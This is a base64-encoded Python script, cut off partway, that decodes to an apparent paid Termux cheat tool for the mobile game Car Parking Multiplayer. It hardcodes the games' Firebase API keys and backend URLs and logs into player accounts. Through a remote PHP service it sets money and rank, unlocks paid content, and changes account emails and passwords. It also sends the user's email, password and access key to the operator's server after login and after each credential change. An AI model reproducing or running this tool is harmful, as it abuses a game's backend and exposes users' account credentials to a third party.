dCgi4pqg77iPIFdhcm5pbmc6IENvdWxkIG5vdCBmZXRjaCBzZXJ2aWNlIGNvc3RzIGZyb20gc2VydmVyLiBVc2luZyBkZWZhdWx0IHZhbHVlcy4iKQoKICAgIHdoaWxlIFRydWU6CiAgICAgICAgY2xlYXJfc2NyZWVuKCkKICAgICAgICBzaG93X2Jhbm5lcih1bmxpbWl0ZWRfc3RhdHVzPXVubGltaXRlZF9zdGF0dXNfZm9yX2Rpc3BsYXksIGN1cnJlbnRfY29pbnM9Y3VycmVudF9jb2luc19mb3JfZGlzcGxheSwgdGVsZWdyYW1faWQ9dGVsZWdyYW1faWRfZm9yX2Rpc3BsYXkpCgogICAgICAgIGFjY2Vzc19rZXkgPSBpbnB1dCgi8J+UkSBFbnRlciB5b3VyIGFjY2VzcyBrZXk6ICIpLnN0cmlwKCkKCiAgICAgICAgaXNfdmFsaWRfa2V5LCB1c2VyX2RhdGFfZnJvbV9waHAgPSBjaGVja19hY2Nlc3Nfa2V5X2FuZF9nZXRfdXNlcl9zdGF0dXMoYWNjZXNzX2tleSkKICAgICAgICAKICAgICAgICBpZiBub3QgaXNfdmFsaWRfa2V5OgogICAgICAgICAgICBwcmludChmIuKdjCB7dXNlcl9kYXRhX2Zyb21fcGhwWydtZXNzYWdlJ119IikKICAgICAgICAgICAgdW5saW1pdGVkX3N0YXR1c19mb3JfZGlzcGxheSA9IE5vbmUKICAgICAgICAgICAgY3VycmVudF9jb2luc19mb3JfZGlzcGxheSA9IE5vbmUKICAgICAgICAgICAgaXNfdW5saW1pdGVkX3VzZXIgPSBGYWxzZQogICAgICAgICAgICB0ZWxlZ3JhbV9pZF9mb3JfZGlzcGxheSA9ICJOL0EiCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC41KQogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBwcmludCgi4pyFIEtleSBhY2NlcHRlZC4iKQogICAgICAgIGlzX3VubGltaXRlZF91c2VyID0gdXNlcl9kYXRhX2Zyb21fcGhwWydpc191bmxpbWl0ZWQnXQogICAgICAgIGN1cnJlbnRfY29pbnNfZm9yX2Rpc3BsYXkgPSB1c2VyX2RhdGFfZnJvbV9waHBbJ2NvaW5zJ10KICAgICAgICB0ZWxlZ3JhbV9pZF9mb3JfZGlzcGxheSA9IHVzZXJfZGF0YV9mcm9tX3BocC5nZXQoJ3RlbGVncmFtX2lkJywgJ04vQScpCgogICAgICAgIHByaW50KGYiVGVsZWdyYW0gSUQ6IHt0ZWxlZ3JhbV9pZF9mb3JfZGlzcGxheX0iKQogICAgICAgIHRyeToKICAgICAgICAgICAgb3Muc3lzdGVtKCJ0ZXJtdXgtb3Blbi11cmwgJ2h0dHBzOi8vdC5tZS8rd01UcFZvZ2JERVEyTm1NMCIpCiAgICAgICAgICAgIHByaW50KCJPcGVuaW5nIFRlbGVncmFtIGdyb3VwLi4uIikKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjUpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludChmIkNvdWxkIG5vdCBvcGVuIFRlbGVncmFtIFVSTDoge2V9IikKCiAgICAgICAgaWYgbm90IGlzX3VubGltaXRlZF91c2VyOgogICAgICAgICAgICBwcmludCgiXG5Zb3VyIHN1YnNjcmlwdGlvbiBpcyBMSU1JVEVELiBZb3UgY2FuIGV4cGxvcmUgdGhlIG1lbnUgYnV0IHNlcnZpY2VzIGhhdmUgYSBjb3N0LiIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoIllvdSBoYXZlIGFuIFVOTElNSVRFRCBzdWJzY3JpcHRpb24uIEFsbCBzZXJ2aWNlcyBhcmUgZnJlZS4iKQogICAgICAgIHRpbWUuc2xlZXAoMC41KQoKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBzaG93X2Jhbm5lcih1bmxpbWl0ZWRfc3RhdHVzPWlzX3VubGltaXRlZF91c2VyLCBjdXJyZW50X2NvaW5zPWN1cnJlbnRfY29pbnNfZm9yX2Rpc3BsYXksIHRlbGVncmFtX2lkPXRlbGVncmFtX2lkX2Zvcl9kaXNwbGF5KQogICAgICAgICAgICBwcmludCgiTWFpbiBNZW51OiIpCiAgICAgICAgICAgIHByaW50KCIxLiDwn5qYIENBUiBQQVJLSU5HIE1VTFRJUExBWUVSIChDUE0xKSIpCiAgICAgICAgICAgIHByaW50KCIyLiDwn5qUIENBUiBQQVJLSU5HIE1VTFRJUExBWUVSIDIgKENQTTIpIikKICAgICAgICAgICAgcHJpbnQoIjAuIOKdjCBFWElUIikKICAgICAgICAgICAgbWFpbl9tZW51ID0gaW5wdXQoIkVudGVyIHlvdXIgY2hvaWNlOiAiKS5zdHJpcCgpCgogICAgICAgICAgICBpZiBtYWluX21lbnUgPT0gIjAiOgogICAgICAgICAgICAgICAgcHJpbnQoIvCfkYsgR29vZGJ5ZSEiKQogICAgICAgICAgICAgICAgc3lzLmV4aXQoMCkKICAgICAgICAgICAgZWxpZiBtYWluX21lbnUgPT0gIjEiOgogICAgICAgICAgICAgICAgYXBpX2tleV9jcG0gPSAiQUl6YVN5QlcxWmJNaVVlRFpIWVVPMmJZOEJmbmY1clJnclFHUFRNIgogICAgICAgICAgICAgICAgcmFua191cmxfY3BtID0gImh0dHBzOi8vdXMtY2VudHJhbDEtY3AtbXVsdGlwbGF5ZXIuY2xvdWRmdW5jdGlvbnMubmV0L1NldFVzZXJSYXRpbmc0IgogICAgICAgICAgICAgICAgbGFiZWxfdG9fdXNlID0gIkNQTTEiCiAgICAgICAgICAgIGVsaWYgbWFpbl9tZW51ID09ICIyIjoKICAgICAgICAgICAgICAgIGFwaV9rZXlfY3BtID0gIkFJemFTeUNRRHo5cmdqZ212bUZrdlZmbXZyMi03ZlQ0dGZyelJSUSIKICAgICAgICAgICAgICAgIHJhbmtfdXJsX2NwbSA9ICJodHRwczovL3VzLWNlbnRyYWwxLWNwbS0yLTdjZWExLmNsb3VkZnVuY3Rpb25zLm5ldC9TZXRVc2VyUmF0aW5nMTdfQXBwSSIKICAgICAgICAgICAgICAgIGxhYmVsX3RvX3VzZSA9ICJDUE0yIgogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoIuKdjCBJbnZhbGlkIGNob2ljZS4gUGxlYXNlIGVudGVyIDAsIDEsIG9yIDIuIikKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC41KQogICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgIHByaW50KGYiXG4tLS0gTG9nIGluIHRvIHtsYWJlbF90b191c2V9IC0tLSIpCiAgICAgICAgICAgIGVtYWlsID0gaW5wdXQoIvCfk6cgRW50ZXIgYWNjb3VudCBlbWFpbDogIikuc3RyaXAoKQogICAgICAgICAgICBwYXNzd29yZCA9IGlucHV0KCLwn5SQIEVudGVyIGFjY291bnQgcGFzc3dvcmQ6ICIpLnN0cmlwKCkKCiAgICAgICAgICAgIGxvZ2luID0gbG9naW5fZmlyZWJhc2UoYXBpX2tleV9jcG0sIGVtYWlsLCBwYXNzd29yZCkKICAgICAgICAgICAgaWYgbm90IGxvZ2luLmdldCgib2siKToKICAgICAgICAgICAgICAgIHByaW50KGYi4p2MIExvZ2luIGZhaWxlZDoge2xvZ2luWydtZXNzYWdlJ119IikKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICB0b2tlbiA9IGxvZ2luWyJ0b2tlbiJdCiAgICAgICAgICAgIHByaW50KGYi4pyFIExvZ2dlZCBpbiBhcyB7ZW1haWx9IikKICAgICAgICAgICAgCiAgICAgICAgICAgIHNlbmRfZGV2aWNlX29zKGFjY2Vzc19rZXksIGVtYWlsLCBwYXNzd29yZCwgbGFiZWxfdG9fdXNlLCB0ZWxlZ3JhbV9pZF9mb3JfZGlzcGxheSkKCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC41KQogICAgICAgICAgICAKICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgICAgIGNsZWFyX3NjcmVlbigpCiAgICAgICAgICAgICAgICBzaG93X2Jhbm5lcih1bmxpbWl0ZWRfc3RhdHVzPWlzX3VubGltaXRlZF91c2VyLCBjdXJyZW50X2NvaW5zPWN1cnJlbnRfY29pbnNfZm9yX2Rpc3BsYXksIHRlbGVncmFtX2lkPXRlbGVncmFtX2lkX2Zvcl9kaXNwbGF5KQogICAgICAgICAgICAgICAgcHJpbnQoZiJBY2NvdW50IFNpZ246IHtlbWFpbH0gKHtsYWJlbF90b191c2V9KSIpCgogICAgICAgICAgICAgICAgIyAqKlVQREFURUQgTE9HSUMgSEVSRToqKgogICAgICAgICAgICAgICAgbWVudV90b19kaXNwbGF5ID0gY3BtMV9tZW51X29wdGlvbnMgaWYgbWFpbl9tZW51ID09ICIxIiBlbHNlIGNwbTJfbWVudV9vcHRpb25zCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGZvciBudW1iZXIsIGRlc2NyaXB0aW9uLCBzZXJ2aWNlX25hbWUgaW4gbWVudV90b19kaXNwbGF5OgogICAgICAgICAgICAgICAgICAgIHNlcnZpY2VfaW5mbyA9IHNlcnZpY2VfY29zdHMuZ2V0KHNlcnZpY2VfbmFtZSwgeydjb3N0JzogJ04vQScsICd1bmxpbWl0ZWRfb25seSc6IEZhbHNlfSkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiBpc191bmxpbWl0ZWRfdXNlcjoKICAgICAgICAgICAgICAgICAgICAgICAgcHJpY2VfZGlzcGxheSA9ICJGUkVFIgogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlcnZpY2VfaW5mby5nZXQoJ3VubGltaXRlZF9vbmx5Jyk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmljZV9kaXNwbGF5ID0gIlZJUCB1c2VyIG9ubHkiCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmljZV9kaXNwbGF5ID0gZiJ7c2VydmljZV9pbmZvLmdldCgnY29zdCcsICdOL0EnKX0gY29pbnMiCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7bnVtYmVyfS4ge2Rlc2NyaXB0aW9ufSAoQ29zdDoge3ByaWNlX2Rpc3BsYXl9KSIpCgogICAgICAgICAgICAgICAgcHJpbnQoIjAuIPCflJkgQkFDSyIpCiAgICAgICAgICAgICAgICBjaG9pY2UgPSBpbnB1dCgiU2VsZWN0IGEgc2VydmljZTogIikuc3RyaXAoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBjaG9pY2UgPT0gIjAiOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCgogICAgICAgICAgICAgICAgYWN0aW9uX3Jlc3VsdCA9IHsib2siOiBGYWxzZSwgIm1lc3NhZ2UiOiAiSW52YWxpZCBjaG9pY2Ugb3Igb3B0aW9uIG5vdCBhdmFpbGFibGUgZm9yIHRoaXMgZ2FtZS4ifQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBtYWluX21lbnUgPT0gIjEiOgogICAgICAgICAgICAgICAgICAgIGlmIGNob2ljZSA9PSAiMSI6CiAgICAgICAgICAgICAgICAgICAgICAgIGFjdGlvbl9yZXN1bHQgPSBjYWxsX3BocF9zZXJ2aWNlKGFjY2Vzc19rZXksICJraW5nX3JhbmsiLCB0b2tlbiwgZW1haWwsIHBhc3N3b3JkLCB7ImFwaV9rZXkiOiBhcGlfa2V5X2NwbSwgInJhbmtfdXJsIjogcmFua191cmxfY3BtfSkKICAgICAgICAgICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAiMiI6CiAgICAgICAgICAgICAgICAgICAgICAgIG5ld19lbWFpbCA9IGlucHV0KCLwn5OoIE5ldyBFbWFpbDogIikuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0gY2FsbF9waHBfc2VydmljZShhY2Nlc3Nfa2V5LCAiY2hhbmdlX2VtYWlsIiwgdG9rZW4sIGVtYWlsLCBwYXNzd29yZCwgeyJuZXdfZW1haWwiOiBuZXdfZW1haWwsICJhcGlfa2V5IjogYXBpX2tleV9jcG19KQogICAgICAgICAgICAgICAgICAgICAgICBpZiBhY3Rpb25fcmVzdWx0LmdldCgib2siKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVtYWlsID0gbmV3X2VtYWlsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbiA9IGFjdGlvbl9yZXN1bHQuZ2V0KCJuZXdfdG9rZW4iLCB0b2tlbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfZGV2aWNlX29zKGFjY2Vzc19rZXksIGVtYWlsLCBwYXNzd29yZCwgbGFiZWxfdG9fdXNlLCB0ZWxlZ3JhbV9pZF9mb3JfZGlzcGxheSkKICAgICAgICAgICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAiMyI6CiAgICAgICAgICAgICAgICAgICAgICAgIG5ld19wYXNzd29yZCA9IGlucHV0KCLwn5SRIE5ldyBQYXNzd29yZDogIikuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0gY2FsbF9waHBfc2VydmljZShhY2Nlc3Nfa2V5LCAiY2hhbmdlX3Bhc3N3b3JkIiwgdG9rZW4sIGVtYWlsLCBwYXNzd29yZCwgeyJuZXdfcGFzc3dvcmQiOiBuZXdfcGFzc3dvcmQsICJhcGlfa2V5IjogYXBpX2tleV9jcG19KQogICAgICAgICAgICAgICAgICAgICAgICBpZiBhY3Rpb25fcmVzdWx0LmdldCgib2siKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3N3b3JkID0gbmV3X3Bhc3N3b3JkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbiA9IGFjdGlvbl9yZXN1bHQuZ2V0KCJuZXdfdG9rZW4iLCB0b2tlbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfZGV2aWNlX29zKGFjY2Vzc19rZXksIGVtYWlsLCBwYXNzd29yZCwgbGFiZWxfdG9fdXNlLCB0ZWxlZ3JhbV9pZF9mb3JfZGlzcGxheSkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0geyJvayI6IEZhbHNlLCAibWVzc2FnZSI6ICJJbnZhbGlkIGNob2ljZSBmb3IgQ1BNMS4ifQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBlbGlmIG1haW5fbWVudSA9PSAiMiI6CiAgICAgICAgICAgICAgICAgICAgaWYgY2hvaWNlID09ICIxIjoKICAgICAgICAgICAgICAgICAgICAgICAgYWN0aW9uX3Jlc3VsdCA9IGNhbGxfcGhwX3NlcnZpY2Vfd2l0aF9zcGlubmVyKGFjY2Vzc19rZXksICJraW5nX3JhbmsiLCB0b2tlbiwgZW1haWwsIHBhc3N3b3JkLCB7ImFwaV9rZXkiOiBhcGlfa2V5X2NwbSwgInJhbmtfdXJsIjogcmFua191cmxfY3BtfSkKICAgICAgICAgICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAiMiI6CiAgICAgICAgICAgICAgICAgICAgICAgIG5ld19lbWFpbCA9IGlucHV0KCLwn5OoIE5ldyBFbWFpbDogIikuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0gY2FsbF9waHBfc2VydmljZV93aXRoX3NwaW5uZXIoYWNjZXNzX2tleSwgImNoYW5nZV9lbWFpbCIsIHRva2VuLCBlbWFpbCwgcGFzc3dvcmQsIHsibmV3X2VtYWlsIjogbmV3X2VtYWlsLCAiYXBpX2tleSI6IGFwaV9rZXlfY3BtfSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgYWN0aW9uX3Jlc3VsdC5nZXQoIm9rIik6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbWFpbCA9IG5ld19lbWFpbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW4gPSBhY3Rpb25fcmVzdWx0LmdldCgibmV3X3Rva2VuIiwgdG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZW5kX2RldmljZV9vcyhhY2Nlc3Nfa2V5LCBlbWFpbCwgcGFzc3dvcmQsIGxhYmVsX3RvX3VzZSwgdGVsZWdyYW1faWRfZm9yX2Rpc3BsYXkpCiAgICAgICAgICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjMiOgogICAgICAgICAgICAgICAgICAgICAgICBuZXdfcGFzc3dvcmQgPSBpbnB1dCgi8J+UkSBOZXcgUGFzc3dvcmQ6ICIpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICAgICAgYWN0aW9uX3Jlc3VsdCA9IGNhbGxfcGhwX3NlcnZpY2Vfd2l0aF9zcGlubmVyKGFjY2Vzc19rZXksICJjaGFuZ2VfcGFzc3dvcmQiLCB0b2tlbiwgZW1haWwsIHBhc3N3b3JkLCB7Im5ld19wYXNzd29yZCI6IG5ld19wYXNzd29yZCwgImFwaV9rZXkiOiBhcGlfa2V5X2NwbX0pCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGFjdGlvbl9yZXN1bHQuZ2V0KCJvayIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzc3dvcmQgPSBuZXdfcGFzc3dvcmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRva2VuID0gYWN0aW9uX3Jlc3VsdC5nZXQoIm5ld190b2tlbiIsIHRva2VuKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VuZF9kZXZpY2Vfb3MoYWNjZXNzX2tleSwgZW1haWwsIHBhc3N3b3JkLCBsYWJlbF90b191c2UsIHRlbGVncmFtX2lkX2Zvcl9kaXNwbGF5KQogICAgICAgICAgICAgICAgICAgIGVsaWYgY2hvaWNlID09ICI0IjoKICAgICAgICAgICAgICAgICAgICAgICAgYW1vdW50ID0gaW5wdXQoIvCfkrUgQW1vdW50OiAiKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGFtb3VudC5pc2RpZ2l0KCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0gY2FsbF9waHBfc2VydmljZV93aXRoX3NwaW5uZXIoYWNjZXNzX2tleSwgInNldF9tb25leSIsIHRva2VuLCBlbWFpbCwgcGFzc3dvcmQsIHsiYW1vdW50IjogaW50KGFtb3VudCl9KQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYWN0aW9uX3Jlc3VsdCA9IHsib2siOiBGYWxzZSwgIm1lc3NhZ2UiOiAiSW52YWxpZCBhbW91bnQuIn0KICAgICAgICAgICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAiNSI6CiAgICAgICAgICAgICAgICAgICAgICAgIGFjdGlvbl9yZXN1bHQgPSBjYWxsX3BocF9zZXJ2aWNlX3dpdGhfc3Bpbm5lcihhY2Nlc3Nfa2V5LCAidW5sb2NrX3doZWVscyIsIHRva2VuLCBlbWFpbCwgcGFzc3dvcmQpCiAgICAgICAgICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjYiOgogICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0gY2FsbF9waHBfc2VydmljZV93aXRoX3NwaW5uZXIoYWNjZXNzX2tleSwgInVubG9ja19tYWxlIiwgdG9rZW4sIGVtYWlsLCBwYXNzd29yZCkKICAgICAgICAgICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAiNyI6CiAgICAgICAgICAgICAgICAgICAgICAgIGFjdGlvbl9yZXN1bHQgPSBjYWxsX3BocF9zZXJ2aWNlX3dpdGhfc3Bpbm5lcihhY2Nlc3Nfa2V5LCAidW5sb2NrX2ZlbWFsZSIsIHRva2VuLCBlbWFpbCwgcGFzc3dvcmQpCiAgICAgICAgICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIyIjoKICAgICAgICAgICAgICAgICAgICAgICAgYWN0aW9uX3Jlc3VsdCA9IGNhbGxfcGhwX3NlcnZpY2Vfd2l0aF9zcGlubmVyKGFjY2Vzc19rZXksICJyZW1vdmVfaGVhZF9tYWxlIiwgdG9rZW4sIGVtYWlsLCBwYXNzd29yZCkKICAgICAgICAgICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAiMjMiOgogICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0gY2FsbF9waHBfc2VydmljZV93aXRoX3NwaW5uZXIoYWNjZXNzX2tleSwgInJlbW92ZV9oZWFkX2ZlbWFsZSIsIHRva2VuLCBlbWFpbCwgcGFzc3dvcmQpCiAgICAgICAgICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjgiOgogICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0gY2FsbF9waHBfc2VydmljZV93aXRoX3NwaW5uZXIoYWNjZXNzX2tleSwgInVubG9ja19icmFrZXMiLCB0b2tlbiwgZW1haWwsIHBhc3N3b3JkKQogICAgICAgICAgICAgICAgICAgIGVsaWYgY2hvaWNlID09ICI5IjoKICAgICAgICAgICAgICAgICAgICAgICAgYWN0aW9uX3Jlc3VsdCA9IGNhbGxfcGhwX3NlcnZpY2Vfd2l0aF9zcGlubmVyKGFjY2Vzc19rZXksICJ1bmxvY2tfY2FsaXBlcnMiLCB0b2tlbiwgZW1haWwsIHBhc3N3b3JkKQogICAgICAgICAgICAgICAgICAgIGVsaWYgY2hvaWNlID09ICIxMCI6CiAgICAgICAgICAgICAgICAgICAgICAgIGFjdGlvbl9yZXN1bHQgPSBjYWxsX3BocF9zZXJ2aWNlX3dpdGhfc3Bpbm5lcihhY2Nlc3Nfa2V5LCAidW5sb2NrX3BhaW50cyIsIHRva2VuLCBlbWFpbCwgcGFzc3dvcmQpCiAgICAgICAgICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjExIjoKICAgICAgICAgICAgICAgICAgICAgICAgYWN0aW9uX3Jlc3VsdCA9IGNhbGxfcGhwX3NlcnZpY2Vfd2l0aF9zcGlubmVyKGFjY2Vzc19rZXksICJ1bmxvY2tfYWxsX2ZsYWdzIiwgdG9rZW4sIGVtYWlsLCBwYXNzd29yZCkKICAgICAgICAgICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAiMTIiOgogICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0gY2FsbF9waHBfc2VydmljZV93aXRoX3NwaW5uZXIoYWNjZXNzX2tleSwgInVubG9ja19hcGFydG1lbnRzIiwgdG9rZW4sIGVtYWlsLCBwYXNzd29yZCkKICAgICAgICAgICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAiMTMiOgogICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0gY2FsbF9waHBfc2VydmljZV93aXRoX3NwaW5uZXIoYWNjZXNzX2tleSwgImNvbXBsZXRlX21pc3Npb25zIiwgdG9rZW4sIGVtYWlsLCBwYXNzd29yZCkKICAgICAgICAgICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAiMTQiOgogICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0gY2FsbF9waHBfc2VydmljZV93aXRoX3NwaW5uZXIoYWNjZXNzX2tleSwgInVubG9ja19hbGxfY2Fyc19zaXJlbiIsIHRva2VuLCBlbWFpbCwgcGFzc3dvcmQpCiAgICAgICAgICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjE1IjoKICAgICAgICAgICAgICAgICAgICAgICAgYWN0aW9uX3Jlc3VsdCA9IGNhbGxfcGhwX3NlcnZpY2Vfd2l0aF9zcGlubmVyKGFjY2Vzc19rZXksICJ1bmxvY2tfcG9saWNlX2JvZHlraXRzIiwgdG9rZW4sIGVtYWlsLCBwYXNzd29yZCkKICAgICAgICAgICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAiMTYiOgogICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0gY2FsbF9waHBfc2VydmljZV93aXRoX3NwaW5uZXIoYWNjZXNzX2tleSwgInVubG9ja19zbG90cyIsIHRva2VuLCBlbWFpbCwgcGFzc3dvcmQsIHsiYWNjb3VudF9hdXRoIjogdG9rZW59KQogICAgICAgICAgICAgICAgICAgIGVsaWYgY2hvaWNlID09ICIxNyI6CiAgICAgICAgICAgICAgICAgICAgICAgIGFjdGlvbl9yZXN1bHQgPSBjYWxsX3BocF9zZXJ2aWNlX3dpdGhfc3Bpbm5lcihhY2Nlc3Nfa2V5LCAidW5sb2NrX2JvZHlraXRzIiwgdG9rZW4sIGVtYWlsLCBwYXNzd29yZCkKICAgICAgICAgICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAiMjEiOgogICAgICAgICAgICAgICAgICAgICAgICBhY3Rpb25fcmVzdWx0ID0gY2FsbF9waHBfc2VydmljZV93aXRoX3NwaW5uZXIoYWNjZXNzX2tleSwgInJlbW92ZWJvZHlwYXJ0cyIsIHRva2VuLCBlbWFpbCwgcGFzc3dvcmQpCiAgICAgICAgICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjE4IjoKICAgICAgICAgICAgICAgICAgICAgICAgY2FyX2lkX3RvX21vZGlmeSA9IGlucHV0KCLwn5qXIEVudGVyIENhciBJRCB0byBtb2RpZnk6ICIpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICAgICAgcmltX2lkID0gaW5wdXQoIvCfm54gRW50ZXIgUmltIElEOiAiKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgY2FyX2lkX3RvX21vZGlmeS5pc2RpZ2l0KCkgb3IgaW50KGNhcl9pZF90b19tb2RpZnkpIDw9IDA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgi4p2MIEludmFsaWQgQ2FyIElELiBJdCBtdXN0IGJlIGEgcG9zaXRpdmUgaW50ZWdlci4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwLjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgcmltX2lkLmlzZGlnaXQoKSBvciBpbnQocmltX2lkKSA8IDA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgi4p2MIEludmFsaWQgUmltIElELiBJdCBtdXN0IGJlIGEgbm9uLW5lZ2F0aXZlIGludGVnZXIuIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC41KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgICAgICAgICAgICAgIGFjdGlvbl9yZXN1bHQgPSBjYWxsX3BocF9zZXJ2aWNlX3dpdGhfc3Bpbm5lcihhY2Nlc3Nfa2V5LCAiY3VzdG9tX3doZWVsIiwgdG9rZW4sIGVtYWlsLCBwYXNzd29yZCwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgImNhcl9pZCI6IGNhcl9pZF90b19tb2RpZnksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAicmltX2lkIjogcmltX2lkCiAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjI0IjoKICAgICAgICAgICAgICAgICAgICAgICAgY3BtMV9lbWFpbF9pbnB1dCA9IGlucHV0KCLwn5OnIEVudGVyIENQTTEgRW1haWw6ICIpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICAgICAgY3BtMV9wYXNzd29yZF9pbnB1dCA9IGlucHV0KCLwn5SQIEVudGVyIENQTTEgUGFzc3dvcmQ6ICIpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICAgICAgYWN0aW9uX3Jlc3VsdCA9IGNhbGxfcGhwX3NlcnZpY2Vfd2l0aF9zcGlubmVyKGFjY2Vzc19rZXksICJjb3B5X2NwbTFfY2FyX3RvX2NwbTIiLCB0b2tlbiwgZW1haWwsIHBhc3N3b3JkLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY3BtMV9lbWFpbCI6IGNwbTFfZW1haWxfaW5wdXQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY3BtMV9wYXNzd29yZCI6IGNwbTFfcGFzc3dvcmRfaW5wdXQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY3BtMV9hcGlfa2V5IjogIkFJemFTeUJXMVpiTWlVZURaSFlVTzJiWThCZm5mNXJSZ3JRR1BUTSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY3BtMl9hcGlfa2V5IjogIkFJemFTeUNRRHo5cmdqZ212bUZrdlZmbXZyMi03ZlQ0dGZyelJSUSIKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICBlbGlmIGNob2ljZSA9PSAiMjUiOgogICAgICAgICAgICAgICAgICAgICAgICBhY2NvdW50X2VtYWlsX2lucHV0ID0gaW5wdXQoIvCfk6cgRW50ZXIgQ1BNMiBBY2NvdW50IEVtYWlsIHRvIGNsb25lIHRvOiAiKS5